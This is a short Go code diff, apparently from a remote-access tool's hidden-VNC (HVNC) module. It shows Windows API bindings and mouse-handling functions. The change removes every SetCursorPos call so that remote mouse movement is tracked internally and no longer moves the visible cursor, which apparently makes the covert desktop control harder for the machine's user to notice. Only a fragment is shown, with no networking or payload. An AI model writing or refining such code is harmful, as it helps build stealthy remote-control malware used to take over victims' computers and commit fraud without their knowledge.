@@ -31,7 +31,6 @@ var (
 	procGetTopWindow        = user32.NewProc("GetTopWindow")
 	procCreateProcessW      = kernel32.NewProc("CreateProcessW")
 	procSendInputHVNC       = user32.NewProc("SendInput")
-	procSetCursorPosHVNC    = user32.NewProc("SetCursorPos")
 	procGetCursorPosHVNC    = user32.NewProc("GetCursorPos")
 	procWindowFromPoint     = user32.NewProc("WindowFromPoint")
 	procScreenToClient      = user32.NewProc("ScreenToClient")
@@ -795,7 +794,6 @@ func startHVNCProcessOnThread(filePath string) error {
 func hvncMouseMoveOnThread(display int, x, y int32) error {
 	bounds, _ := hvncResolveCaptureBounds(display)
 	if bounds.Dx() <= 0 || bounds.Dy() <= 0 {
-		procSetCursorPosHVNC.Call(uintptr(x), uintptr(y))
 		hvncInputMu.Lock()
 		hvncLastCursor = point{x: x, y: y}
 		hvncHasCursor = true
@@ -818,7 +816,6 @@ func hvncMouseMoveOnThread(display int, x, y int32) error {
 		absY = bounds.Max.Y - 1
 	}
 
-	procSetCursorPosHVNC.Call(uintptr(absX), uintptr(absY))
 	hvncInputMu.Lock()
 	hvncLastCursor = point{x: int32(absX), y: int32(absY)}
 	hvncHasCursor = true
